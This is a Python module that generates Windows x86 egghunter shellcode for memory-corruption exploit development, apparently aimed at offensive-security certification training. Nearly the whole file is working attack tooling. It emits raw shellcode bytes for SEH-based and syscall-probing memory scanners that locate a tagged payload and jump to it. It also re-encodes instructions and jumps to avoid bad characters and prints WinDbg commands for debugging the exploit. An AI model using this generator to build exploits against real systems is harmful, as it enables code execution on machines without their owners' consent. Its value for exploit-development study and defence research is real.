"""Unified Windows x86 egghunter generator.

This module provides a deterministic, dependency-free API for generating
OSWE-style egghunters as raw bytes.

Strategies:
- seh_win10: SEH hunter with StackBase overwrite/fix for modern Win10 checks
- seh_classic: classic SEH hunter
- syscall: int 0x2e syscall probing hunter (NtAccessCheck style)
- auto: chooses strategy deterministically from constraints
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Literal

from .core import resolve_syscall

Strategy = Literal["seh_win10", "seh_classic", "syscall", "auto"]

CAPABILITIES: dict[str, dict[str, bool]] = {
    "seh_win10": {
        "safe_modern_windows": True,
        "requires_stack_control": True,
    },
    "seh_classic": {
        "safe_modern_windows": False,
    },
    "syscall": {
        "requires_syscall": True,
        "safe_modern_windows": True,
    },
}

_HANDLER_SIGNATURE = b"\x6a\x0c\x59\x8b\x04\x0c"
_SEH_SETUP_SIGNATURE = b"\x64\x89"
_PROTECTED_SEMANTIC_ANCHORS: tuple[bytes, ...] = (
    b"\x64\x89\x25\x00\x00\x00\x00",  # mov fs:[0],esp
    b"\x64\x89\x0D\x04\x00\x00\x00",  # mov fs:[4],ecx
    b"\x6A\x0C\x59\x8B\x04\x0C\xB1\xB8\x83\x04\x08\x06",  # CONTEXT->EIP += 6 path
    b"\xF3\xAF",  # repe scasd
)
_PROTECTED_OP_NAMES: frozenset[str] = frozenset(
    {
        "fs0_write",
        "fs4_write",
        "seh_record_layout",
        "context_eip_plus_6",
        "repe_scasd",
    }
)
MUTATION_MAP: dict[str, tuple[bytes, ...]] = {
    "zero_eax": (b"\x31\xc0", b"\x29\xc0"),
    "zero_ebx": (b"\x31\xdb", b"\x29\xdb"),
    "zero_ecx": (b"\x31\xc9", b"\x29\xc9"),
    "zero_edx": (b"\x31\xd2", b"\x29\xd2"),
    "zero_eax_alt": (b"\x33\xc0", b"\x2b\xc0"),
    "zero_ebx_alt": (b"\x33\xdb", b"\x2b\xdb"),
    "inc_eax": (b"\x40", b"\x83\xc0\x01"),
    "inc_ecx": (b"\x41", b"\x83\xc1\x01"),
    "inc_edx": (b"\x42", b"\x83\xc2\x01"),
    "inc_ebx": (b"\x43", b"\x83\xc3\x01"),
    "syscall_load_pushpop": (b"",),
    "syscall_load_neg": (b"",),
}


@dataclass(slots=True, frozen=True)
class EgghunterConfig:
    """Configuration for egghunter generation.

    Attributes:
        tag: 4-byte marker. The stage marker is always `tag * 2`.
        badchars: bytes that must not appear in the generated payload.
        nop_sled_size: optional NOP prefix for landing tolerance.
        stackbase_adjust: adjustment used by Win10 SEH StackBase fix sequence.
        debug: print strategy and payload details to stdout.
        output_asm: print assembly template used before returning raw bytes.
        target: syscall-table target key when strategy uses syscall probing.
        syscall_id_override: explicit syscall ID. Strictly preferred over resolver.
    """

    tag: bytes
    badchars: bytes
    nop_sled_size: int = 0
    stackbase_adjust: int = 4
    debug: bool = False
    output_asm: bool = False
    target: str = "win10_x86"
    syscall_id_override: int | None = None
    enable_mutation: bool = False
    mutation_level: int = 1


def _hex_escape(data: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in data)


def _normalize_badchars(badchars: bytes) -> bytes:
    return bytes(sorted(set(badchars)))


def _validate_no_badchars(buf: bytes, badchars: bytes) -> None:
    hits = sorted(set(buf) & set(_normalize_badchars(badchars)))
    if hits:
        rendered = " ".join(f"{b:02x}" for b in hits)
        raise ValueError(f"Payload contains badchars: {rendered}")


def _pack_i8(value: int) -> int:
    if not (-128 <= value <= 127):
        raise ValueError(f"short jump offset out of range: {value}")
    return value & 0xFF


def _validate_seh_constraints(
    handler_addr: int,
    record_addr: int,
    stack_base: int,
    stack_limit: int,
) -> None:
    if not (stack_limit < record_addr < stack_base):
        raise ValueError("record_addr must be within (stack_limit, stack_base)")
    if record_addr % 4 != 0:
        raise ValueError("record_addr must be 4-byte aligned")
    if handler_addr <= stack_base:
        raise ValueError("handler_addr must be greater than stack_base")


def build_jump(offset: int, badchars: bytes) -> bytes:
    """Build jump encoding while honoring badchars.

    Prefers short jump (`EB xx`). Falls back to near jump (`E9 <rel32>`).
    Raises ValueError if both encodings violate badchar constraints.
    """

    badchars = _normalize_badchars(badchars)

    # Short jump: rel8 from next instruction.
    if -128 <= offset <= 127:
        candidate = bytes((0xEB, _pack_i8(offset)))
        if not set(candidate) & set(badchars):
            return candidate

    # Near jump: rel32 from next instruction.
    near = b"\xE9" + int(offset).to_bytes(4, "little", signed=True)
    if not set(near) & set(badchars):
        return near

    raise ValueError("Could not encode jump without badchars")


def build_controlled_jump(offset: int, badchars: bytes) -> bytes:
    badchars = _normalize_badchars(badchars)
    bad = set(badchars)

    if -128 <= offset <= 127:
        short = bytes((0xEB, _pack_i8(offset)))
        if not (set(short) & bad):
            return short

    near = b"\xE9" + int(offset).to_bytes(4, "little", signed=True)
    if not (set(near) & bad):
        return near

    # forced-taken conditional jump:
    # xor ecx,ecx; test ecx,ecx; je <offset>
    if not (-128 <= offset <= 127):
        raise ValueError("Forced conditional jump requires short-range offset")
    forced = b"\x31\xC9\x85\xC9\x74" + bytes((_pack_i8(offset),))
    if not (set(forced) & bad):
        return forced

    raise ValueError("Could not encode controlled jump without badchars")


class EgghunterBuilder:
    """Unified egghunter generator for Windows x86 exploit development.

    SEH flow (seh_win10):
    1. Install an exception registration record via fs:[0].
    2. Set fs:[4] (StackBase) to satisfy modern stack checks.
    3. Scan memory and intentionally fault (`repe scasd`) on invalid pages.
    4. Exception handler modifies CONTEXT.EIP by +6 to advance scan safely.
    5. Continue scanning until `tag` and `tag` are matched, then jump to payload.

    Syscall flow (syscall):
    1. Advance page-by-page.
    2. Probe accessibility with `int 0x2e` syscall.
    3. On valid page, compare two consecutive 4-byte tag values.
    4. Jump to payload start when match is found.
    """

    def __init__(self, config: EgghunterConfig):
        self.config = config
        self._last_mutation_events: list[str] = []
        self._current_strategy: str = "seh_win10"
        self._emitted_jumps: list[bytes] = []

    def build(self, strategy: Strategy = "seh_win10") -> bytes:
        """Return final egghunter bytes for the selected strategy."""

        self._validate_config()
        chosen = self._choose_strategy(strategy)
        self._current_strategy = chosen
        self._last_mutation_events = []
        self._emitted_jumps = []

        if chosen == "seh_win10":
            payload = self._build_seh_win10()
        elif chosen == "seh_classic":
            payload = self._build_seh_classic()
        elif chosen == "syscall":
            payload = self._build_syscall()
        else:
            raise ValueError(f"Unsupported strategy: {chosen}")

        payload = (b"\x90" * self.config.nop_sled_size) + payload
        self._validate_payload(payload)

        if self.config.debug:
            self._print_debug(chosen, payload)

        return payload

    def _encode_tag(self) -> tuple[bytes, bytes]:
        tag = self.config.tag
        if len(tag) != 4:
            raise ValueError("Tag must be exactly 4 bytes")
        egg = tag * 2
        return tag, egg

    def _resolve_syscall_id(self) -> int:
        # Strict priority:
        # 1) explicit override
        # 2) table/runtime resolver
        # 3) fail closed
        if self.config.syscall_id_override is not None:
            return self.config.syscall_id_override

        try:
            return resolve_syscall(self.config.target, "NtAccessCheckAndAuditAlarm")
        except Exception as exc:
            raise ValueError(
                "Unable to resolve syscall ID; provide syscall_id_override explicitly"
            ) from exc

    def _choose_strategy(self, strategy: Strategy) -> Literal["seh_win10", "seh_classic", "syscall"]:
        if strategy != "auto":
            return strategy

        capability_order = ("syscall", "seh_win10", "seh_classic")
        badchars = set(_normalize_badchars(self.config.badchars))
        syscall_blockers = {0xCD, 0x2E, 0x3C, 0x05}
        requires_stack_control = True

        for name in capability_order:
            caps = CAPABILITIES.get(name, {})

            if caps.get("requires_syscall", False) and (badchars & syscall_blockers):
                continue
            if caps.get("requires_stack_control", False) and not requires_stack_control:
                continue
            if caps.get("safe_modern_windows", False):
                return name

        for name in capability_order:
            caps = CAPABILITIES.get(name, {})
            if caps.get("requires_syscall", False) and (badchars & syscall_blockers):
                continue
            return name

        raise ValueError("No strategy satisfies capability constraints")

    def _build_syscall(self) -> bytes:
        tag, _ = self._encode_tag()
        badchars = _normalize_badchars(self.config.badchars)
        syscall_id = self._resolve_syscall_id()

        syscall_load = self._encode_syscall(syscall_id, badchars)

        # Classic page probe + dual tag compare.
        body = bytearray()
        body.extend(b"\x66\x81\xCA\xFF\x0F")  # or dx,0xfff
        body.extend(self._mutate_instruction("inc_edx", b"\x42"))  # inc edx
        body.extend(b"\x52")  # push edx
        body.extend(syscall_load)  # load eax=syscall
        body.extend(b"\xCD\x2E")  # int 0x2e
        body.extend(b"\x3C\x05")  # cmp al,5 (access violation)
        body.extend(b"\x5A")  # pop edx

        # jump back length depends on syscall loader width
        jump_back = -17 if len(syscall_load) == 3 else -21
        body.extend(self._build_jump(jump_back))

        body.extend(b"\xB8")
        body.extend(tag)  # first 4-byte tag
        body.extend(b"\x8B\xFA")  # mov edi,edx
        body.extend(b"\xAF")  # scasd
        body.extend(self._build_jump(-22 if len(syscall_load) == 3 else -26))
        body.extend(b"\xAF")  # scasd
        body.extend(self._build_jump(-25 if len(syscall_load) == 3 else -29))
        body.extend(b"\xFF\xE7")  # jmp edi

        payload = bytes(body)

        if self.config.output_asm:
            print("[ASM] syscall")
            print("or dx,0xfff; inc edx; push edx; load eax,syscall; int 0x2e")
            print("cmp al,5; pop edx; je scan_next; mov eax,tag; mov edi,edx")
            print("scasd; jne scan_next; scasd; jne scan_next; jmp edi")

        return payload

    def _build_seh_classic(self) -> bytes:
        tag, _ = self._encode_tag()
        badchars = _normalize_badchars(self.config.badchars)

        # Classic SEH egghunter template.
        payload = (
            b"\xEB\x21\x59\xB8"
            + tag
            + b"\x51\x6A\xFF"
            + self._mutate_instruction("zero_ebx_alt", b"\x33\xDB")
            + b"\x64\x89\x23\x6A\x02\x59\x8B\xFB\xF3\xAF"
            b"\x75\x07\xFF\xE7\x66\x81\xCB\xFF\x0F"
            + self._mutate_instruction("inc_ebx", b"\x43")
            + b"\xEB\xED\xE8\xDA\xFF"
            b"\xFF\xFF\x6A\x0C\x59\x8B\x04\x0C\xB1\xB8\x83\x04\x08\x06\x58"
            b"\x83\xC4\x10\x50"
            + self._mutate_instruction("zero_eax_alt", b"\x33\xC0")
            + b"\xC3"
        )

        if self.config.output_asm:
            print("[ASM] seh_classic")
            print("setup exception record in fs:[0]; scan with repe scasd")
            print("handler adjusts CONTEXT.EIP += 6; resume page scan")

        return payload

    def _build_seh_win10(self) -> bytes:
        tag, _ = self._encode_tag()
        adjust = self.config.stackbase_adjust
        if not (0 <= adjust <= 0x7F):
            raise ValueError("stackbase_adjust must be in range 0..127")

        # Win10-compatible variant:
        # - installs _EXCEPTION_REGISTRATION_RECORD in stack
        # - updates fs:[0] and fs:[4] (StackBase)
        # - does StackBase fix: pop ecx; sub ecx,<adjust>; mov fs:[4],ecx
        # - faults during scan and resumes via handler context fix (EIP += 6)
        setup = b"".join(
            [
                b"\xEB\x2A",  # jmp short to call-site
                b"\x59",  # pop ecx (handler address)
                b"\x51",  # push ecx (Handler)
                b"\x64\xFF\x35\x00\x00\x00\x00",  # push dword ptr fs:[0]
                b"\x64\x89\x25\x00\x00\x00\x00",  # mov fs:[0],esp
                b"\x59",  # pop ecx
                b"\x83\xE9",
                bytes([adjust]),  # sub ecx,adjust
                b"\x64\x89\x0D\x04\x00\x00\x00",  # mov fs:[4],ecx
                b"\xB8",
                tag,  # mov eax,tag
                self._mutate_instruction("zero_ebx", b"\x31\xDB"),  # xor ebx,ebx
                b"\x66\x81\xCB\xFF\x0F",  # or bx,0xfff
                self._mutate_instruction("inc_ebx", b"\x43"),  # inc ebx
                b"\x8B\xFB",  # mov edi,ebx
                b"\xF3\xAF",  # repe scasd (fault on bad pages)
                b"\x75\x0A",  # jne next-page
                b"\xAF",  # scasd second tag
                b"\x75\x07",  # jne next-page
                b"\xFF\xE7",  # jmp edi
                b"\xEB\xED",  # back to scan
                b"\xE8\xD1\xFF\xFF\xFF",  # call setup
            ]
        )

        # Exception handler:
        # stack frame walk + CONTEXT.Eip += 6, then return ExceptionContinueExecution.
        handler = b"".join(
            [
                b"\x6A\x0C",  # push 0xc
                b"\x59",  # pop ecx
                b"\x8B\x04\x0C",  # mov eax,[esp+ecx] (CONTEXT)
                b"\xB1\xB8",  # mov cl,0xb8 (Eip offset)
                b"\x83\x04\x08\x06",  # add dword [eax+ecx],0x6
                b"\x58",  # pop eax
                b"\x83\xC4\x10",  # add esp,0x10
                b"\x50",  # push eax
                self._mutate_instruction("zero_eax", b"\x31\xC0"),  # xor eax,eax
                b"\xC3",  # ret
            ]
        )

        payload = setup + handler

        if self.config.output_asm:
            print("[ASM] seh_win10")
            print("install EXCEPTION_REGISTRATION_RECORD in fs:[0]")
            print("pop ecx; sub ecx,adjust; mov fs:[4],ecx  ; StackBase fix")
            print("scan memory with repe scasd; fault on bad page")
            print("handler: CONTEXT.EIP += 6; return continue-execution")

        return payload

    def _encode_syscall(self, syscall_id: int, badchars: bytes) -> bytes:
        # push/pop when possible
        if 0 <= syscall_id <= 0x7F:
            candidate = b"\x6A" + bytes([syscall_id]) + b"\x58"
            _validate_no_badchars(candidate, badchars)
            self._record_mutation("syscall_load", "push/pop", candidate)
            return candidate

        # otherwise NEG technique
        neg = (0x100000000 - syscall_id) & 0xFFFFFFFF
        raw = neg.to_bytes(4, "little", signed=False)
        if any(b in badchars for b in raw):
            raise ValueError("NEG syscall encoding contains badchars")

        candidate = b"\xB8" + raw + b"\xF7\xD8"
        _validate_no_badchars(candidate, badchars)
        self._record_mutation("syscall_load", "neg-load", candidate)
        return candidate

    def _validate_config(self) -> None:
        if len(self.config.tag) != 4:
            raise ValueError("Tag must be exactly 4 bytes")
        if self.config.nop_sled_size < 0:
            raise ValueError("nop_sled_size must be >= 0")
        if not (0 <= self.config.stackbase_adjust <= 0x7F):
            raise ValueError("stackbase_adjust must be in range 0..127")
        if self.config.mutation_level < 1:
            raise ValueError("mutation_level must be >= 1")
        # Logical preflight model for SEH assumptions.
        _validate_seh_constraints(
            handler_addr=0x2000,
            record_addr=0x1000,
            stack_base=0x1800,
            stack_limit=0x0800,
        )

    def _validate_payload(self, payload: bytes) -> None:
        if len(payload) >= 300:
            raise ValueError(f"Payload too large: {len(payload)} bytes (must be < 300)")
        _validate_no_badchars(payload, self.config.badchars)
        # enforce tag shape again here for fail-closed behavior
        if len(self.config.tag) != 4:
            raise ValueError("Tag must be exactly 4 bytes")
        self._validate_mutation_safety(payload)
        if self.config.enable_mutation:
            self._validate_mutated_payload(payload)

    def _validate_mutation_safety(self, payload: bytes) -> None:
        badchars = set(_normalize_badchars(self.config.badchars))
        unsafe_candidates = (b"\x31\xc0", b"\x31\xdb", b"\x33\xc0", b"\x33\xdb", b"\x42", b"\x43")
        flagged = [op for op in unsafe_candidates if set(op) & badchars]
        duplicates = [op for op in flagged if payload.count(op) > 0]
        if duplicates:
            rendered = ", ".join(_hex_escape(op) for op in duplicates)
            raise ValueError(f"Unsafe instruction residue after mutation: {rendered}")

    def _print_debug(self, strategy: str, payload: bytes) -> None:
        layout = self.analyze_layout(payload)
        print(f"[+] Strategy: {strategy}")
        print(f"[+] Payload length: {len(payload)}")
        print(f"[+] Tag offset: 0x{layout['tag_offset']:X}")
        handler_offset = layout["seh_handler_offset"]
        if handler_offset is None:
            print("[+] Handler offset: None")
        else:
            print(f"[+] Handler offset: 0x{handler_offset:X}")
        print(f"[+] NOP sled: {layout['nop_sled_size']} bytes")
        print(f"[+] Mutation enabled: {'yes' if self.config.enable_mutation else 'no'}")
        print(f"[+] Mutation level: {self.config.mutation_level}")
        for line in self.mutation_report():
            print(f"[+] {line}")
        print(f"[+] Final payload length: {len(payload)}")

    def analyze_layout(self, payload: bytes) -> dict[str, int | None]:
        tag_offset = payload.find(self.config.tag)
        if tag_offset < 0:
            raise ValueError("Tag not found in payload")
        nop_sled_size = 0
        for b in payload:
            if b != 0x90:
                break
            nop_sled_size += 1

        handler_offset = payload.find(_HANDLER_SIGNATURE)
        setup_offset = payload.find(_SEH_SETUP_SIGNATURE)
        return {
            "payload_size": len(payload),
            "nop_sled_size": nop_sled_size,
            "tag_offset": tag_offset,
            "seh_handler_offset": handler_offset if handler_offset >= 0 else None,
            "seh_setup_offset": setup_offset if setup_offset >= 0 else None,
        }

    def windbg_helper(self, payload: bytes) -> str:
        first = payload[:4]
        if len(first) < 4:
            raise ValueError("Payload must contain at least 4 bytes")
        first_hex = " ".join(f"{b:02x}" for b in first)
        return "\n".join(
            [
                "u <addr>",
                "db <addr>",
                f"s -b 0 L?80000000 {first_hex}",
                "!exchain",
            ]
        )

    def _build_jump(self, offset: int) -> bytes:
        if self.config.enable_mutation:
            encoded = build_controlled_jump(offset, self.config.badchars)
        else:
            encoded = build_jump(offset, self.config.badchars)
        self._emitted_jumps.append(encoded)
        return encoded

    def _mutate_instruction(self, name: str, original: bytes) -> bytes:
        if name in _PROTECTED_OP_NAMES:
            return original
        if not self.config.enable_mutation or self.config.mutation_level <= 0:
            return original
        if self.config.mutation_level != 1:
            raise ValueError("Only mutation_level=1 is supported")

        options = MUTATION_MAP.get(name)
        if not options:
            return original
        if options[0] != original:
            raise ValueError(f"Mutation map mismatch for {name}")

        bad = set(_normalize_badchars(self.config.badchars))
        if not (set(original) & bad):
            return original

        for candidate in options[1:]:
            if len(candidate) > len(original) and self._current_strategy == "seh_win10":
                # keep deterministic sizing where SEH offsets are fixed at level 1
                continue
            if set(candidate) & bad:
                continue
            self._record_mutation(name, f"{_hex_escape(original)} -> {_hex_escape(candidate)}", candidate)
            return candidate

        raise ValueError(f"No valid mutation encoding for {name}")

    def _record_mutation(self, name: str, description: str, candidate: bytes) -> None:
        _validate_no_badchars(candidate, self.config.badchars)
        self._last_mutation_events.append(f"Replaced {name}: {description}")

    def _validate_mutated_payload(self, payload: bytes) -> None:
        _validate_no_badchars(payload, self.config.badchars)
        if len(payload) >= 300:
            raise ValueError("Mutated payload exceeds size limits")
        self._validate_jump_targets(payload)
        self._validate_mutation_safety(payload)
        self._validate_protected_semantic_anchors(payload)
        self._validate_layout_integrity(payload)

    def _validate_jump_targets(self, payload: bytes) -> None:
        size = len(payload)
        search_from = 0
        for encoded in self._emitted_jumps:
            idx = payload.find(encoded, search_from)
            if idx < 0:
                idx = payload.find(encoded)
            if idx < 0:
                raise ValueError("Emitted jump sequence missing from mutated payload")
            search_from = idx + len(encoded)
            op = encoded[0]
            if op in (0xEB, 0x74):
                rel = int.from_bytes(encoded[1:2], "little", signed=True)
                target = idx + 2 + rel
                if not (0 <= target < size):
                    raise ValueError("Mutated short jump target out of range")
            elif op == 0xE9:
                rel32 = int.from_bytes(encoded[1:5], "little", signed=True)
                target = idx + 5 + rel32
                if not (0 <= target < size):
                    raise ValueError("Mutated near jump target out of range")

    def _validate_protected_semantic_anchors(self, payload: bytes) -> None:
        if self._current_strategy in ("seh_win10", "seh_classic"):
            for anchor in _PROTECTED_SEMANTIC_ANCHORS:
                if payload.find(anchor) < 0:
                    raise ValueError("Protected semantic anchor missing after mutation")

    def _validate_layout_integrity(self, payload: bytes) -> None:
        layout = self.analyze_layout(payload)
        if layout["tag_offset"] is None or int(layout["tag_offset"]) < 0:
            raise ValueError("Invalid tag offset after mutation")
        if self._current_strategy in ("seh_win10", "seh_classic"):
            if layout["seh_handler_offset"] is None:
                raise ValueError("Invalid SEH handler offset after mutation")
            if layout["seh_setup_offset"] is None:
                raise ValueError("Invalid SEH setup offset after mutation")

    def mutation_report(self) -> list[str]:
        return list(self._last_mutation_events)


__all__ = [
    "CAPABILITIES",
    "EgghunterBuilder",
    "EgghunterConfig",
    "Strategy",
    "build_jump",
    "build_controlled_jump",
]
